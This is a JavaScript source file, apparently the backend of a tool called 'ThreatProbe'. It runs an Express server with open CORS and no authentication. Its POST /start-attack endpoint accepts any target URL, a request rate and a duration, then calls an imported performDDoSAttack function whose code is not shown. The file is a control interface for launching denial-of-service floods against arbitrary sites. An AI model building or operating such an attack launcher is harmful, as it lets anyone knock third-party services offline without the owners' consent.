import express from 'express';
import cors from 'cors';
import { performDDoSAttack } from './ddosAttack.js';

const app = express();
const PORT = 3000;

app.use(cors());
app.use(express.json());

app.post('/start-attack', async (req, res) => {
  const { targetUrl, requestsPerSecond, durationSeconds } = req.body;

  if (!targetUrl || !requestsPerSecond || !durationSeconds) {
    return res.status(400).json({ message: 'Missing required fields' });
  }

  console.log(`[API] Attack Requested on ${targetUrl}`);
  
  performDDoSAttack(targetUrl, requestsPerSecond, durationSeconds);
  
  res.json({ message: `Started attack on ${targetUrl}` });
});

app.get('/', (req, res) => {
  res.send('ThreatProbe Backend Running!');
});

app.listen(PORT, () => {
  console.log(` Backend server running on http://localhost:${PORT}`);
});
